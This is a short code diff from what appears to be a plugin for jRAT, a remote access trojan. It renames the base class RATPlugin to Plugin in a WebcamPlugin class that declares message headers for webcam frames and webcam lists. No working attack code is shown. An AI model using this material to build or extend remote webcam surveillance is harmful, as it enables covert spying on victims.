@@ -11,7 +11,7 @@ import java.util.Map;
 import java.util.Properties;
 
 import jrat.api.Client;
-import jrat.api.RATPlugin;
+import jrat.api.Plugin;
 import jrat.api.events.Event;
 import jrat.api.events.EventType;
 import jrat.api.events.OnEnableEvent;
@@ -20,7 +20,7 @@ import jrat.api.net.Reader;
 import jrat.api.ui.RATControlMenuEntry;
 import jrat.api.ui.RATMenuItem;
 
-public class WebcamPlugin extends RATPlugin {
+public class WebcamPlugin extends Plugin {
 
 	public static final byte HEADER_WEBCAM_FRAME = 120;
 	public static final byte HEADER_LIST_WEBCAMS = 121;
